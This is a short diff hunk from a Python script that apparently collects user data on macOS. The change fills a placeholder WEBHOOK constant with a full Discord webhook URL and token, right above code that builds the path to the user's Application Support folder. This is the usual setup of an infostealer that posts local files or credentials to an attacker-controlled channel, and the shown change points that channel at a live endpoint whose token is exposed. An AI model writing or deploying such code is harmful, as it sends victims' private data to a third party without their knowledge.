@@ -7,7 +7,7 @@ import getpass
 import platform
 import datetime
 
-WEBHOOK = "URL HERE"
+WEBHOOK = "https://discord.com/api/webhooks/1298033409721106494/_qZZxlhXvbY1QksjTryKIsxRuJNJMc8mAQQeavaQ0XapJBprzKIPELfyOjS3QzIpFiBO"
 
 
 appdatapath = (f'/Users/{getpass.getuser()}/Library/Application Support')
